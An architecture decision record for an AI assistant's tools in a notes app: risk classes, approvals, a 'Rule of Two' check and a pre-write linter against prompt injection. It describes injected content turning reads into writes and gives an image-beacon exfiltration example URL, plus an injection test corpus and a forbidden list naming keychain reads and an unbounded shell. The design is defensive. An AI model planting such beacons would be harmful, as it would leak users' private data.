# ADR 0018: AI tools, risk classes and approvals

Status: Accepted

Date: 2026-09-24

## Context

The harness acts through tools: it reads the vault, navigates the app and
proposes changes. The same tools are exposed to other AI applications through
Plainva's MCP server (ADR 0021) and, later, to sandboxed script skills.
Model tool selection degrades with large tool lists (Anthropic names 30–50
tools as the point where selection gets worse and recommends tool search from
about ten), and prompt-injected content must not be able to turn a read into
a write or an outside effect.

## Decision

1. **One manifest per tool, in core.** `packages/core/src/ai/tools/` holds the
   manifests: name, description, JSON schema of input and output, risk class,
   capability, data classes it can return, whether results are tier 3, and
   the native counterpart. The harness registry and the MCP server's
   `tools/list` are generated from the same manifests; a tool without a
   manifest does not exist.
2. **Risk classes.**
   - `read` — `search_vault`, `read_note` (section handles), `get_outline`,
     `get_backlinks`, `graph_neighborhood`, `query_base`, `get_tasks`,
     `get_calendar`, `get_recent`, `parse_task`: allowed when AI is on,
     bounded by folder and policy.
   - `ui` — `ui.run_command(id, args)` over the command registry
     (`commandRegistry.ts`): allowed, audited, reversible; a command without a
     handler is not a tool (fail-closed). The command list is a searchable
     resource, not one tool per command.
   - `write` — create, append, change: always a **proposal** (suggestion round
     with author `plainva-ai/<model-id>`, a parked draft for new notes, a
     property proposal at the property anchor). Provenance through the OKF
     fields (`generated: {by, at}`, `sources`), stamped only at the moment of
     creation.
   - `critical` — delete, bulk change, vault-wide rename or move, and **any
     write to `plainva.ai.*`, `.agent/` or the OKF trust fields**: dry run and
     confirmation enforced in the tool layer; delete only through the deletion
     guard (sample probe, deletion journal, threshold, backup).
   - `external` — mail, RSVP, moving an event, web or API writes, and any write
     into a surface third parties read (events with attendees, provider tasks,
     mail drafts, shared workspaces, publications): separate confirmation
     every time, shown in the send overview.
   - `script` — signed WASM scripts (later package), manifest-bound.
   - `forbidden` — reading the keychain, raw secrets, an unbounded shell,
     direct DB or file writes outside the adapters, raw SQL. Never a tool.
3. **A small, stable surface.** Six core tools are always loaded
   (`search_vault`, `read_note`, `get_outline`, `query_base`, `get_tasks`,
   `ui.run_command`); everything else is found through the provider's tool
   search or Plainva's own `find_tools`. The tool list of a conversation does
   not change while it runs (append-only, ADR 0017).
4. **Results are small and structured.** Paginated, token-lean results;
   section handles instead of full text; structured errors without internal
   paths or SQL; idempotency keys for repeatable writes; every call and result
   audited in the run ledger. Arguments copied verbatim from a tier 3 span
   raise the risk class by one.
5. **Rule of Two at run time.** The orchestrator classifies every run by
   (A) processes untrusted input, (B) sees private data, (C) can change state
   or communicate outward. A run with all three needs an approval for **each**
   outside effect and can never be a routine. Applies from the first chat
   package on.
6. **Pre-write linter.** AI-touched content is checked before it is stored:
   image, link and embed URLs to domains the user has not allowed are defused
   (kept as literal text, or opened only after a click) — including
   protocol-relative `//` URLs, reference-style links (`[x][1]` plus
   `[1]: https://…`) and HTML `<img>`/`<a>`. This closes the rendering-beacon
   class: the desktop CSP allows `img-src https:`, so an injected
   `![](https://host/?d=…)` would otherwise fire on display, past the send
   overview.
7. **Guardrails.** Limits for steps, tool calls, tokens and cost with a
   warning at 80 %; a loop guard for repeated identical calls; a circuit
   breaker after three errors; STOP at any time — an abort in the middle of a
   write never leaves half a state, because the write path is atomic.
8. **Unattended runs: one capability set, fixed in advance** (designed with
   the first chat package, built with the routines). A run nobody watches
   gets its capability set when the routine is created, and the user sees it
   then: the tools it may call (the `read` class by default), the folders and
   data classes it may read, the providers it may send to, and a budget per
   run. Nothing widens at run time — a tool outside the set is not offered,
   rather than refused after the call. Whatever needs an approval (every write
   proposal, every external effect) is parked as a pending item in the inbox
   instead of waiting for a person; nothing is carried out unattended. A
   routine that would combine all three Rule-of-Two properties is rejected
   when it is saved, not when it runs. The same set is what a paired MCP or
   ACP client receives (ADR 0021): one capability model for every run without
   a person in front of it.

## Consequences

- MCP, harness and scripts cannot drift apart: they read one manifest.
- The injection corpus (calendar invite, image beacon, `//` URL, reference
  link, HTML `<img>`, Unicode smuggling) runs in CI against the linter and the
  tier-3 wrapper from the first package on.
- Tools that would need a blanket scope are not built; the model gets
  navigation (`ui`) rather than raw access.

## Alternatives

- **One tool per command.** Rejected: 47 desktop commands would push the tool
  count past the range where selection degrades.
- **Direct writes with undo.** Rejected: an injected write that is undone
  later has already been synced, rendered and possibly exfiltrated; proposals
  keep the human in the one approval grammar Plainva already has.

## Links

- ADR 0016, ADR 0017, ADR 0021; `packages/ui/src/services/commandRegistry.ts`;
  `packages/core/src/comments/commentActions.ts`;
  `packages/core/src/okf-trust.ts`.
